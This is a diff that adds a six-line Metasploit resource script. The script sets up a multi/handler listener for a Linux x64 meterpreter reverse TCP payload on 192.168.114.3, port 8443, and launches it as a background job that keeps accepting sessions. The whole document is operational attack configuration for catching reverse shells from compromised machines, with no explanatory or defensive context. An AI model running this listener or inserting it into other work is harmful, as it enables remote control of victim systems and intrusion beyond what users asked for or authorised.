@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.114.3
+set LPORT 8443
+set ExitOnSession false
+exploit -j -z
